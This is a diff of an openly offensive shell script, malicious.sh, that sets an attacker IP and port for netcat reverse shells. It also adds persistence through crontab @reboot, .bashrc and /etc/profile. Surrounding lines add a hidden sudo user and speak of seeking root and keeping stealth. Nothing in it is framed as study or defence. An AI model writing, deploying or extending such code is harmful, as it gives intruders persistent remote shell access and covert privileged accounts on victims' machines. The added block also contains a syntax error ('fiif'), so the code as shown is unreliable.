@@ -37,7 +37,7 @@ seek_root() {
 
     # If all else fails, try our reverse shell
     echo "Attempting reverse shell..." >> /tmp/script_log
-    nc 172.20.10.4 4444 -e /bin/bash &
+    nc 172.20.10.4 87 -e /bin/bash &
 
     log_activity "Root-seeking attempt finished. No luck this time."
     echo "Root-seeking finished." >> /tmp/script_log
@@ -51,7 +51,7 @@ maintain_access() {
     usermod -aG sudo hidden_user
     
     # Set up a persistent reverse shell
-    echo "*/5* ** * nc YOUR_WINDOWS_IP 4444 -e /bin/bash" | crontab -
+    echo "*/5* ** * nc 172.20.10.4 87 -e /bin/bash" | crontab -
 }
 
 # Run the script persistently
@@ -72,9 +72,15 @@ if is_running; then
     exit 0
 fi
 
+if [ "$(id -u)" -eq 0 ]; then
+    log_activity "Already root. Maintaining stealth."
+    echo "Already root!" >> /tmp/script_log
+    return
+fiif
+echo "@reboot /home/kali/Desktop/malicious.sh" | crontab - || true
 # Set up persistence via multiple methods
-echo "@reboot /path/to/malicious.sh" | crontab -
-echo "/path/to/malicious.sh" >> ~/.bashrc
-echo "/path/to/malicious.sh" >> /etc/profile
+echo "@reboot /home/kali/Desktop/malicious.sh" | crontab -
+echo "/home/kali/Desktop/malicious.sh" >> ~/.bashrc
+echo "/home/kali/Desktop/malicious.sh" >> /etc/profile
 
 log_activity "Script initialized and running persistently"
